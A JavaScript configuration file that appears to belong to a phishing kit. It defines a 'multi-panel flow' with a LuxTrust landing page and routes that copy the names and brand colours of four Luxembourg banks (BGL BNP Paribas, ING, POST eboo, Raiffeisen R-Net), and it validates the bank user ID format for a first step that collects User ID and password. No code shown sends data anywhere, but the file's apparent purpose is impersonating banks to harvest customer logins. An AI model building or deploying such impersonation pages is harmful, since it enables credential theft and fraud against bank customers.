// Central config for Luxembourg multi-panel flow.
// Routes: / (LuxTrust landing), /bgl, /ing, /eboo, /rnet
// Step 1 for every bank is always: User ID (4 digits + 4 letters) + Password.

export const USER_ID_REGEX = /^\d{4}[A-Za-z]{4}$/;
export const USER_ID_EXAMPLE = "1234ABCD";

export function validateUserId(v) {
  const clean = (v || "").replace(/[\s-]/g, "");
  if (!clean) return "User ID is required.";
  if (!USER_ID_REGEX.test(clean))
    return `User ID must be 4 digits + 4 letters (e.g. ${USER_ID_EXAMPLE}).`;
  return "";
}

export const BANKS = [
  {
    slug: "bgl",
    short: "BGL",
    name: "BGL BNP Paribas",
    sub: "Web Banking",
    urlLabel: "/bgl",
    color: "#00915a",
    dark: "#007a4b",
    soft: "#e6f4ed",
    initial: "B",
  },
  {
    slug: "ing",
    short: "ING",
    name: "ING Luxembourg",
    sub: "My ING",
    urlLabel: "/ing",
    color: "#ff6200",
    dark: "#e55700",
    soft: "#fff1e6",
    initial: "I",
  },
  {
    slug: "eboo",
    short: "EBOO",
    name: "POST Luxembourg",
    sub: "eboo eBanking",
    urlLabel: "/eboo",
    color: "#1b4fa0",
    dark: "#143c7a",
    soft: "#e8eefb",
    initial: "P",
  },
  {
    slug: "rnet",
    short: "R-NET",
    name: "Banque Raiffeisen",
    sub: "Banque en ligne R-Net",
    urlLabel: "/rnet",
    color: "#003da5",
    dark: "#002f7d",
    soft: "#e8eefb",
    initial: "R",
  },
];

export function getBank(slug) {
  return BANKS.find((b) => b.slug === (slug || "").toLowerCase());
}
